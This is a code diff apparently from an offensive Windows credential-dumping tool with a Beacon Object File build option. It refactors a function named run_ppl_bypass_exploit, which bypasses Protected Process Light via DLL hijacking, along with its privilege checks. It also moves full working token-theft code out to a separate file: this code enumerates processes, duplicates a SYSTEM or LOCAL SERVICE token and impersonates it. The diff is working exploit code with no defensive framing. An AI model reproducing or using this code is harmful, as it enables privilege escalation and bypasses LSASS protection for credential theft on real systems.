@@ -14,6 +14,7 @@
 #include "../dinvoke.c"
 #include "../syscalls.c"
 #include "../token_priv.c"
+#include "../impersonate.c"
 #endif
 
 BOOL run_ppl_bypass_exploit(
@@ -64,8 +65,8 @@ BOOL run_ppl_bypass_exploit(
     HANDLE hCurrentToken = NULL;
     HANDLE hNewProcessToken = NULL;
     HANDLE hNewProcess = NULL;
-    SECURITY_QUALITY_OF_SERVICE Qos;
-    OBJECT_ATTRIBUTES TokenObjectAttributes;
+    SECURITY_QUALITY_OF_SERVICE Qos = { 0 };
+    OBJECT_ATTRIBUTES TokenObjectAttributes = { 0 };
 
     if (!check_ppl_requirements())
         goto end;
@@ -720,7 +721,7 @@ BOOL find_file_for_transaction(
     FindFirstFileW_t FindFirstFileW;
     FindNextFileW_t FindNextFileW;
     FindClose_t FindClose;
-    OBJECT_ATTRIBUTES oa;
+    OBJECT_ATTRIBUTES oa = { 0 };
     IO_STATUS_BLOCK IoStatusBlock;
     BOOL success;
     DWORD error_code;
@@ -1052,43 +1053,25 @@ end:
 
 BOOL check_ppl_requirements(VOID)
 {
-    HANDLE hToken = NULL;
+    BOOL success = FALSE;
+
     LPCWSTR ppwszRequiredPrivileges[2] = {
         L"SeDebugPrivilege",
         L"SeImpersonatePrivilege"
     };
-    NTSTATUS status;
-    BOOL success;
 
-    // get a handle to our token
-    status = NtOpenProcessToken(
-        NtCurrentProcess(),
-        TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
-        &hToken);
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtOpenProcessToken", status);
+    success = check_token_privileges(
+        NULL,
+        ppwszRequiredPrivileges,
+        ARRAY_SIZE(ppwszRequiredPrivileges),
+        TRUE);
+    if (!success)
         return FALSE;
-    }
 
-    for (int i = 0; i < ARRAY_SIZE(ppwszRequiredPrivileges); i++)
+    // Check windows version >= 6.3
+    if (!is_win_6_point_3_or_grater())
     {
-        // make sure we have all the privileges we need
-        success = check_token_privilege(hToken, ppwszRequiredPrivileges[i], TRUE);
-        if (!success)
-        {
-            NtClose(hToken); hToken = NULL;
-            PRINT_ERR("A privilege is missing: %ls", ppwszRequiredPrivileges[i]);
-            return FALSE;
-        }
-    }
-
-    NtClose(hToken); hToken = NULL;
-
-    // Check windows version >= 8.1
-    if (!is_win_8_point_1_or_grater())
-    {
-        DPRINT_ERR("The Windows version must be 8.1 or greater");
+        PRINT_ERR("The Windows version must be 6.3 or greater");
         return FALSE;
     }
 
@@ -1114,9 +1097,9 @@ BOOL get_hijackeable_dllname(
         return TRUE;
     }
 
-    if (is_win_8_point_1_or_grater())
+    if (is_win_6_point_3_or_grater())
     {
-        wcsncpy(*ppwszDllName, DLL_TO_HIJACK_WIN81, 64);
+        wcsncpy(*ppwszDllName, DLL_TO_HIJACK_WIN63, 64);
         return TRUE;
     }
 
@@ -1125,324 +1108,6 @@ BOOL get_hijackeable_dllname(
     intFree(*ppwszDllName); *ppwszDllName = NULL;
 
     return FALSE;
-}
-
-BOOL impersonate_user(
-    IN LPCWSTR pwszSid,
-    IN PHANDLE phToken,
-    IN LPCWSTR pwszPrivileges[],
-    IN DWORD dwPrivilegeCount)
-{
-    BOOL bReturnValue = FALSE;
-
-    HANDLE hCurrentProcessToken = NULL;
-    *phToken = NULL;
-    HANDLE hToken = NULL;
-    NTSTATUS status;
-    BOOL success;
-
-    status = NtOpenProcessToken(
-        NtCurrentProcess(),
-        MAXIMUM_ALLOWED,
-        &hCurrentProcessToken);
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtOpenProcessToken", status);
-        goto end;
-    }
-
-    success = check_token_privilege(
-        hCurrentProcessToken,
-        L"SeDebugPrivilege",
-        TRUE);
-    if (!success)
-        goto end;
-
-    success = check_token_privilege(
-        hCurrentProcessToken,
-        L"SeImpersonatePrivilege",
-        TRUE);
-    if (!success)
-        goto end;
-
-    success = find_process_token_and_duplicate(
-        pwszSid,
-        pwszPrivileges,
-        dwPrivilegeCount,
-        &hToken);
-    if (!success)
-        goto end;
-
-    success = impersonate(hToken);
-    if (!success)
-        goto end;
-
-    *phToken = hToken;
-    bReturnValue = TRUE;
-
-end:
-    if (hCurrentProcessToken)
-        NtClose(hCurrentProcessToken);
-    if (!bReturnValue && hToken)
-        NtClose(hToken);
-
-    return bReturnValue;
-}
-
-BOOL impersonate(
-    IN HANDLE hToken)
-{
-    NTSTATUS status;
-
-    status = NtSetInformationThread(
-        NtCurrentThread(),
-        ThreadImpersonationToken,
-        &hToken,
-        sizeof(HANDLE));
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtSetInformationThread", status);
-        return FALSE;
-    }
-
-    return TRUE;
-}
-
-BOOL find_process_token_and_duplicate(
-    IN LPCWSTR pwszTargetSid,
-    IN LPCWSTR pwszPrivileges[],
-    IN DWORD dwPrivilegeCount,
-    OUT PHANDLE phToken)
-{
-    BOOL bReturnValue = FALSE;
-
-    PSID pTargetSid = NULL;
-    PVOID pBuffer = NULL;
-    PSYSTEM_PROCESS_INFORMATION pProcInfo = NULL;
-    HANDLE hProcess = NULL, hToken = NULL, hTokenDup = NULL;
-    DWORD dwBufSize = 0x1000;
-    PSID pSidTmp = NULL;
-    LPWSTR pwszUsername = NULL;
-    NTSTATUS status;
-    ConvertStringSidToSidW_t ConvertStringSidToSidW;
-    CLIENT_ID uPid = { 0 };
-    OBJECT_ATTRIBUTES ObjectAttributes;
-    OBJECT_ATTRIBUTES TokenObjectAttributes;
-    SECURITY_QUALITY_OF_SERVICE Qos;
-    BOOL success;
-
-    ConvertStringSidToSidW = (ConvertStringSidToSidW_t)(ULONG_PTR)get_function_address(
-        get_library_address(ADVAPI32_DLL, TRUE),
-        ConvertStringSidToSidW_SW2_HASH,
-        0);
-    if (!ConvertStringSidToSidW)
-    {
-        api_not_found("ConvertStringSidToSidW");
-        goto end;
-    }
-
-    success = ConvertStringSidToSidW(pwszTargetSid, &pTargetSid);
-    if (!success)
-    {
-        function_failed("ConvertStringSidToSidW");
-        goto end;
-    }
-
-    // get information of all currently running processes
-    do
-    {
-        pBuffer = intAlloc(dwBufSize);
-        if (!pBuffer)
-        {
-            malloc_failed();
-            goto end;
-        }
-
-        status = NtQuerySystemInformation(
-            SystemProcessInformation,
-            pBuffer,
-            dwBufSize,
-            &dwBufSize);
-
-        if (NT_SUCCESS(status))
-            break;
-
-        intFree(pBuffer); pBuffer = NULL;
-    } while (status == STATUS_BUFFER_TOO_SMALL || status == STATUS_INFO_LENGTH_MISMATCH);
-
-    if (!NT_SUCCESS(status))
-    {
-        syscall_failed("NtQuerySystemInformation", status);
-        goto end;
-    }
-
-    pProcInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer;
-
-    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
-    InitializeObjectAttributes(&TokenObjectAttributes, NULL, 0, NULL, NULL);
-    Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
-    Qos.ImpersonationLevel = SecurityImpersonation;
-    Qos.ContextTrackingMode = 0;
-    Qos.EffectiveOnly = FALSE;
-    TokenObjectAttributes.SecurityQualityOfService = &Qos;
-
-    while (TRUE)
-    {
-        uPid.UniqueProcess = pProcInfo->UniqueProcessId;
-
-        status = NtOpenProcess(
-            &hProcess,
-            PROCESS_QUERY_INFORMATION,
-            &ObjectAttributes,
-            &uPid);
-        if (NT_SUCCESS(status))
-        {
-            // open a handle to the token of the process
-            status = NtOpenProcessToken(
-                hProcess,
-                TOKEN_QUERY | TOKEN_DUPLICATE,
-                &hToken);
-
-            if (NT_SUCCESS(status))
-            {
-                status = NtDuplicateToken(
-                    hToken,
-                    MAXIMUM_ALLOWED,
-                    &TokenObjectAttributes,
-                    FALSE,
-                    TokenImpersonation,
-                    &hTokenDup);
-
-                if (NT_SUCCESS(status))
-                {
-                    success = token_get_sid(hTokenDup, &pSidTmp);
-                    if (success)
-                    {
-                        success = token_get_username(hTokenDup, &pwszUsername);
-                        if (success)
-                        {
-                            success = token_compare_sids(pSidTmp, pTargetSid);
-                            if (success)
-                            {
-                                DPRINT("Found a potential Process candidate: PID=%d - Image='%ls' - User='%ls'", (USHORT)(ULONG_PTR)pProcInfo->UniqueProcessId, pProcInfo->ImageName.Buffer, pwszUsername);
-
-                                BOOL bTokenIsNotRestricted = FALSE;
-                                success = token_is_not_restricted(hTokenDup, &bTokenIsNotRestricted);
-                                if (success)
-                                {
-                                    if (!bTokenIsNotRestricted)
-                                    {
-                                        DPRINT("This token is restricted.");
-                                    }
-                                    else
-                                    {
-                                        DPRINT("This token is not restricted.");
-
-                                        if (pwszPrivileges && dwPrivilegeCount != 0)
-                                        {
-                                            DWORD dwPrivilegeFound = 0;
-                                            for (DWORD i = 0; i < dwPrivilegeCount; i++)
-                                            {
-                                                if (check_token_privilege(hTokenDup, pwszPrivileges[i], FALSE))
-                                                    dwPrivilegeFound++;
-                                            }
-
-                                            if (dwPrivilegeFound == dwPrivilegeCount)
-                                            {
-                                                DPRINT("Found a valid Token.");
-                                                *phToken = hTokenDup;
-                                                bReturnValue = TRUE;
-                                            }
-                                        }
-                                        else
-                                        {
-                                            DPRINT("Found a valid Token.");
-                                            *phToken = hTokenDup;
-                                            bReturnValue = TRUE;
-                                        }
-                                        DPRINT("The token was not valid.");
-                                    }
-                                }
-                            }
-                            intFree(pwszUsername); pwszUsername = NULL;
-                        }
-                        LocalFree(pSidTmp); pSidTmp = NULL;
-                    }
-                    if (!bReturnValue)
-                    {
-                        NtClose(hTokenDup); hTokenDup = NULL;
-                    }
-                }
-                NtClose(hToken); hToken = NULL;
-            }
-            NtClose(hProcess); hProcess = NULL;
-        }
-        // If we found a valid token, stop
-        if (bReturnValue)
-            break;
-
-        // If next entry is null, stop
-        if (!pProcInfo->NextEntryOffset)
-            break;
-
-        // Increment SYSTEM_PROCESS_INFORMATION pointer
-        pProcInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pProcInfo + pProcInfo->NextEntryOffset);
-    }
-
-    if (!bReturnValue)
-    {
-        PRINT_ERR("No valid process token to impersonate was found.");
-    }
-
-end:
-    if (pTargetSid)
-        LocalFree(pTargetSid);
-    if (pBuffer)
-        intFree(pBuffer);
-
-    return bReturnValue;
-}
-
-BOOL impersonate_system(
-    OUT PHANDLE phSystemToken)
-{
-    BOOL success;
-    LPCWSTR pwszPrivileges[2] = {
-        L"SeDebugPrivilege",
-        L"SeAssignPrimaryTokenPrivilege"
-    };
-
-    success = impersonate_user(
-        L"S-1-5-18",
-        phSystemToken,
-        pwszPrivileges,
-        ARRAY_SIZE(pwszPrivileges));
-
-    if (!success)
-    {
-        PRINT_ERR("Could not impersonate SYSTEM");
-    }
-
-    return success;
-}
-
-BOOL impersonate_local_service(
-    OUT PHANDLE phLocalServiceToken)
-{
-    BOOL success;
-    
-    success = impersonate_user(
-        L"S-1-5-19",
-        phLocalServiceToken,
-        NULL,
-        0);
-
-    if (!success)
-    {
-        PRINT_ERR("Could not impersonate LOCAL SERVICE");
-    }
-
-    return success;
 }
 
 #ifdef BOF
